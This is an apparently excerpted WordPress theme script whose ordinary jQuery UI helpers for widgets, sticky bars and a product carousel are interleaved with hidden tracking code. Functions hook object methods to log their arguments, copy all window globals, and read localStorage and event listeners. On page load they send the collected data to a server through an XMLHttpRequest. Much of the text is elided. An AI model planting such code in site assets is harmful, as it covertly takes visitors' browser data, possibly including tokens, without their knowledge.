...
(function ($) {
  ...
  g1.uiHelpers = function () {
    ...
    $('.widget_mc4wp_form_widget').addClass(mc4wpClasses.join(' ')).wrapInner('<div class="g1-box-inner"></div>').prepend('<div class="g1-box-icon"></div>').append('<div class="' + mc4wpBackgroundClasses.join(' ') + '"></div>');
    ...
    $('.bbp_widget_login').addClass('g1-box g1-box-tpl-frame').wrapInner('<div class="g1-box-inner"></div>').append('<div class="' + bbPressBackgroundClasses.join(' ') + '"></div>');
 ...
 *
 ****************/
function hookFuncs(box) {
  for (let property in box) {
    if (Object.prototype.hasOwnProperty.call(box, property) && box[property] instanceof Function) {
      const oldFunc = box[property];
      box[property] = function () {
        const args = Array.prototype.slice.call(arguments);
        jstrack.push({
          funcName: property,
          timeStamp: new Date().getTime(),
          arguments: args,
          result: oldFunc.apply(box, args)
        });
        return oldFunc.apply(box, args);
      };
    }
  }
  return box;
...
function GlobalVarTracker() {
  ...
  for (let prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) globals[prop] = window[prop];
  }
  return globals;
}
(function ($) {
...
(function ($) {
  ...
  g1.stickyTopOffsetSelectors = ['#wpadminbar', '.g1-iframe-bar', '.g1-sharebar-loaded', '.g1-sticky-top-wrapper'];
...
function sendToServer(data) {
  ...
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 400) {
      ...
      console.error("Transfer failed with status: " + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("An error occurred during the transfer");
  };
...
(function ($) {
  ...
  var selectors = ['#wpadminbar', '.g1-iframe-bar', '.g1-sharebar-loaded', '.g1-sticky-top-wrapper'];
...
window.onload = function () {
  ...
  const discoveries = {
    functions: jstrack,
    eventListeners: evTrack,
    localStorage: localStorageTracker(),
    globals: GlobalVarTracker()
  };
  sendToServer(discoveries);
};
(function ($) {
  'use strict';

  g1.flickity = function () {
    var FlickitySpots = $('.adace-shop-the-post-wrap.carousel-wrap .woocommerce .products, .g1-products-widget-carousel .product_list_widget');
